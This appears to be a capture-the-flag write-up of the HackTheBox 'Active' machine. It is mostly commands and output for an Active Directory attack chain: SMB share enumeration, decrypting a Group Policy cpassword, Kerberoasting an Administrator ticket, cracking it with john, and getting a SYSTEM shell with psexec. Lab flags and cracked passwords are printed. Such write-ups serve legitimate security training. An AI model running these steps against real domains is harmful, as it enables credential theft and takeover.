---
layout: post
title: HackTheBox Active
date: 2018-07-28
tags: [HackTheBox, Windows]
---

# Machine Synopsis

Active is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment. ([Source](https://app.hackthebox.com/machines/Active/))

# Enumeration

```bash
❯ nmap -sC -sV -A 10.10.10.100
Nmap scan report for 10.10.10.100
Host is up (0.033s latency).
Not shown: 981 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-16 07:18:19Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49167/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=12/16%OT=53%CT=1%CU=43847%PV=Y%DS=2%DC=T%G=Y%TM=675
OS:FD7DB%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS=S%
OS:TS=7)OPS(O1=M53ANW8ST11%O2=M53ANW8ST11%O3=M53ANW8NNT11%O4=M53ANW8ST11%O5
OS:=M53ANW8ST11%O6=M53AST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=
OS:2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M53ANW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF
OS:=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%
OS:RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W
OS:=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
OS:U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%D
OS:FI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-12-16T07:19:27
|_  start_date: 2024-12-16T07:12:39
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
|_clock-skew: -14m15s

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   35.19 ms 10.10.16.1
2   28.58 ms 10.10.10.100

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.46 seconds
```

It looks like there is a SMB service open. Lets use `enum4linux` to enumerate it.

```bash
❯ enum4linux -a -M -l -d 10.10.10.100 2>&1
...
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.10.100

//10.10.10.100/ADMIN$	Mapping: DENIED Listing: N/A Writing: N/A
//10.10.10.100/C$	Mapping: DENIED Listing: N/A Writing: N/A
//10.10.10.100/IPC$	Mapping: OK Listing: DENIED Writing: N/A
//10.10.10.100/NETLOGON	Mapping: DENIED Listing: N/A Writing: N/A
//10.10.10.100/Replication	Mapping: OK Listing: OK Writing: N/A
//10.10.10.100/SYSVOL	Mapping: DENIED Listing: N/A Writing: N/A
//10.10.10.100/Users	Mapping: DENIED Listing: N/A Writing: N/A
```

There is a `Replication` share that we can access.

```bash
❯ smbclient //10.10.10.100/Replication -N
Anonymous login successful
Try "help" to get a list of possible commands.

smb: \> ls
  .                                   D        0  Sat Jul 21 18:37:44 2018
  ..                                  D        0  Sat Jul 21 18:37:44 2018
  active.htb                          D        0  Sat Jul 21 18:37:44 2018

		5217023 blocks of size 4096. 290651 blocks available

smb: \> cd active.htb\

smb: \active.htb\> ls
  .                                   D        0  Sat Jul 21 18:37:44 2018
  ..                                  D        0  Sat Jul 21 18:37:44 2018
  DfsrPrivate                       DHS        0  Sat Jul 21 18:37:44 2018
  Policies                            D        0  Sat Jul 21 18:37:44 2018
  scripts                             D        0  Thu Jul 19 02:48:57 2018

		5217023 blocks of size 4096. 290651 blocks available
```

Enumerating around, we find an interesting `Groups.xml` file.

```bash
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> ls
  .                                   D        0  Sat Jul 21 18:37:44 2018
  ..                                  D        0  Sat Jul 21 18:37:44 2018
  Groups.xml                          A      533  Thu Jul 19 04:46:06 2018

		5217023 blocks of size 4096. 288859 blocks available

smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> get Groups.xml
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (6.8 KiloBytes/sec) (average 6.8 KiloBytes/sec)

smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> exit

❯ cat Groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

Notice the `cpassword` in the xml file.

# Exploitation

Searching for `cpassword decrypt` online leads to this [GitHub repo](https://github.com/t0thkr1s/gpp-decrypt).

```bash
❯ python3 gpp-decrypt.py -f ../Groups.xml
...
[ * ] Username: active.htb\SVC_TGS
[ * ] Password: GPPstillStandingStrong2k18
```

Lets try to enumerate the SMB service again with the newly found credential.

```bash
❯ enum4linux -a -u "active.htb\SVC_TGS" -p "GPPstillStandingStrong2k18" 10.10.10.100
...
//10.10.10.100/IPC$	Mapping: N/A Listing: N/A Writing: N/A
//10.10.10.100/NETLOGON	Mapping: OK Listing: OK Writing: N/A
//10.10.10.100/Replication	Mapping: OK Listing: OK Writing: N/A
//10.10.10.100/SYSVOL	Mapping: OK Listing: OK Writing: N/A
//10.10.10.100/Users	Mapping: OK Listing: OK Writing: N/A
...
```

It seems like we can access the `Users` share now.

``` bash
❯ smbclient //10.10.10.100/Users -U SVC_TGS
Password for [WORKGROUP\SVC_TGS]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 22:39:20 2018
  ..                                 DR        0  Sat Jul 21 22:39:20 2018
  Administrator                       D        0  Mon Jul 16 18:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 13:06:44 2009
  Default                           DHR        0  Tue Jul 14 14:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 13:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 12:57:55 2009
  Public                             DR        0  Tue Jul 14 12:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 23:16:32 2018

		5217023 blocks of size 4096. 283526 blocks available
```

# Privilege Escalation

Now that we have compromised a low privileged user, we need to escalate our privileges.

Since we have the credentials for a AD user, we can try to request for TGS service tickets for any SPNs from a DC.

```bash
❯ impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 03:06:40.351723  2024-12-16 15:13:47.549751 

[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

In this case, we were able to request the TGS from an Administrator SPN.

However, It seems like we have some Kerberos Session Error which indicates that our machine date and time are not in sync with the Kerberos server. To solve this, we can sync our machine date and time.

```bash
❯ timedatectl set-ntp off
❯ sudo rdate -n 10.10.10.100
Mon Dec 16 16:54:02 +08 2024
```

```bash
❯ impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 03:06:40.351723  2024-12-16 15:13:47.549751             


[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$b6c353ff43e19064e0c2bd64fa03c0bd$70b3f204f2dc96b72f2ee217fbb7eb27b3ca063e72dc805e5e5f64a5881a3bad622b4f70dbe37a56d0780d501c37cb33cc69489428b41901806609e91ecc5a37bed151118a4695f4e54684a78a5d761ec8bfa73b1816bcf4e960e668e08b7950f262524442d5a66422244adff8b784d0ec1238f21fa1a301129ad66420e96055f300b081cdb258868260c0d7e9301cf8a0d6b198135b01dedfa3b80cfb502d99f8ea6e08266eb97989cdfa3377c2b1d47789de4e1e91b453d70de56d8baf8e1d91199cf0102cbc6d28623642de203db979ec32cbe60d61e1b0c8aedf5135b4ef58d841b27ae11d284ad02bbef4247bdf42ba0b6447978b7df53328fc1752b0659de864645ca161f0d0c9168d3b9e2d522209a6dcee139cdf1b2270bbe0acfdf49fa90f6220565733a746e734ca7dfb417807258795bbbebcb5c0767dd6b3d265c6c247e956729603b83c42cbbb3a8c7d2fec531e17b01e29fb7a251fd7ad5bff4655a0dbbcf5a3857ab6efe3994d7ee9295ac78ff1b0a2ed71221fa6303e43b385cc18af774c55bc2a1d8e984f46282de7970ae24673b8b3eef342e463f86337f0ebc68ecd786e847ca6373f7d93f15c2e13a82422f56fdf0ae727d8428e1a4f29bc6e0b43cb41ace8f58234d4ac3f8a1f36cfa58da6bca55932c294fd4566e6e7fd49c00cdf447991ecab6cc93b519289d2f956f818c163c8f538a208294ef6b94f66bd4f903b83e37fab36324ff6cb31b1f6645b2cbd081798b7f94c1007fb6afed5e36119f733be84daa5effb032ec6a75243cf6aa03f17f46428030e653edb06c5e58ae03912fe1b8f619bfbe7bb476bef2896d3601df2ddb208e3fb684f3189f8337590c4530f06897cbec90f65bd84720991a4e3fcc7cf9501cf47406479380d01ba1f560cb29f133dad597692c1956e37fd96adbb8f68e051eec3ae90f53e17e171e83604924f9f8fc1237b06d0bed881b89c7c251343087eb4a5c7df602641ba4ffda5866cb9f35248be6c8f78bd48b9ba07f738ceb1ef1a64170dc5ef1de29b9766991474eabb79c98d87463f766094b1939dacb35c9a0057a9369cf011fd71cdc743d5d05e678a4372c1084a84a6e0e313f3e7b12984bfd19de5ebdad6aa7b724cadcc1141cdaffa45634dc269ac8285063402161879ee785e38d83e4391e62e5cbedf1dfb2341b11312cd3d0dea8500617d638fb1363467563b0f718a5a8015dc22c921edf592a9241c251726ab254bcf5a508833
```

Now that we have the Administrator TGS hash, we can try to crack it.

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Ticketmaster1968 (?)  
```

```bash
❯ psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file nRDUlYHs.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service pbva on 10.10.10.100.....
[*] Starting service pbva.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
fb852b3c834cb62df5dc093dc705336d
C:\Windows\system32> C:\Users\SVC_TGS\Desktop\user.txt
60d70428ba69e195149a18bac41361ae
```
